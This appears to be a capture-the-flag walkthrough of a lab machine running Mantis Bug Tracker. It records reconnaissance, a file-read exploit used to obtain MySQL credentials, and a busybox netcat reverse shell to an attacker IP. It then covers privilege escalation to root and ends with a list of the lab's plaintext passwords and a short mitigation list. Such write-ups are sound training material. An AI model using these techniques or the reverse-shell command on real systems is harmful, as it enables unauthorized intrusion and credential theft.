## Introduction

In this walkthrough, I worked on the **Mantis** intermediate Linux machine from PG Practice. The target hosted **Mantis Bug Tracker**, and while several public exploits failed initially, I discovered that **directory listing** was enabled under `/admin`. Leveraging this misconfiguration, I accessed the **MySQL configuration file** and retrieved database credentials. Using those, I extracted the **admin password** from the database and logged into the MantisBT web interface. With valid credentials, I exploited a known vulnerability to gain a **shell**. Post-exploitation enumeration using `pspy64` revealed **cleartext credentials** in a running process, which I used to **pivot** to the `mantis` user. This user had **sudo access to all commands**, allowing me to escalate to **root**.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 3306

Version - MariaDB 5.5.5-10.3.34

I don’t have credentials.

## Web

### Port 80

Version - Apache httpd 2.4.41 ((Ubuntu))

```bash
**feroxbuster -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt -C 403,404,400**
```

![image.png](image%203.png)

```bash
gobuster dir -u http://$IP:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 42 -b 400,403,404
```

## Exploitation

![image.png](image%205.png)

Navigating to `bugtracker` I found `Mantis Bug Tracker`.

Searching for public exploits I found the following Unauthenticated RCE https://www.exploit-db.com/exploits/48818

But kept returning errors. I thought of doing this manually, and first decided to reset administrator password.

But it returns the following error:

![image.png](image%206.png)

I tried fuzzing `id` of administrator:

```bash
wfuzz --hl 53 -z range,0-999 http://192.168.165.204/bugtracker/verify.php?id=FUZZ&confirm_hash=
```

But nothing from here either.

```bash
gobuster dir -u http://$IP/bugtracker -w /usr/share/wordlists/dirb/common.txt -t 42 -b 400,403,404 -x .php
```

![image.png](image%207.png)

I found the version of the application digging in `doc` directory.

![image.png](image%208.png)

```bash
feroxbuster -u http://$IP/bugtracker/admin -w /usr/share/wordlists/dirb/common.txt -C 403,404,400
```

I see that we can access directory under `admin` directory. I

![image.png](image%2011.png)

I found the following [exploit](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://mantisbt.org/bugs/view.php%3Fid%3D23173&ved=2ahUKEwj3hPjItoKOAxVczwIHHQqTAzYQFnoECBUQAQ&usg=AOvVaw3kxdBURO9Hn4icIusjNoVP).

![image.png](image%2012.png)

Using it I was able to read `/etc/passwd`. I am gonna try to read `MySQL` credentials which are possibly stored in `/var/www/html/bugtracker/config/config.inc.php`, as from directory enumeration of `config` directory.

![image.png](image%2013.png)

```bash
mysql -u root -p -h $IP --ssl=0
```

```sql
show databases;
use bugtracker;
show tables from bugtracker;
```

![image.png](image%2014.png)

```sql
show columns from mantis_user_table;
select username, realname, email, password, enabled from mantis_user_table;
```

![image.png](image%2015.png)

![image.png](image%2016.png)

After that I got access:

![image.png](image%2017.png)

I need to get a reverse shell and I found the [command execution](https://mantisbt.org/bugs/view.php?id=26091) exploit.

![image.png](image%2018.png)

it didn’t work.

This worked but died.

```bash
busybox nc 192.168.45.159 80 -e /bin/bash
```

Then I wrote `PHP` webshell to `config` directory.

![image.png](image%2021.png)

I see `.sql` file this is related to `MySQL` and I think we don’t need to open it as we already enumerated database.

I cannot read `backup.sh` but it is very likely that it gets executed as cron job. Checking `crontab` and appropriate locations I don’t see anything.

```bash
ls -lah /etc/cron*
cat /etc/crontab
```

Let’s check if it gets executed by running [`pspy64`](https://github.com/DominicBreuker/pspy).

```bash
timeout 3m ./pspy64
```

I suppose there are credentials for `mantis`.

## Shell as mantis

```bash
sudo -l
```

![image.png](image%2023.png)

We are root.

```bash
sudo su
```

## Credentials

```bash
root:SuperSequelPassword
Administrator:prayingmantis
mantis:BugTracker007
```

## Mitigation

- Disable **directory listing** in the web server configuration to prevent unintended file disclosure.
- Store **secrets and credentials** in environment variables or protected vaults, not in config files or processes.
- Regularly **rotate passwords** and avoid reusing them across services.
- Apply all **security updates and patches** to web applications like MantisBT.
- Limit **sudo privileges** to only required commands and users, and audit them frequently.
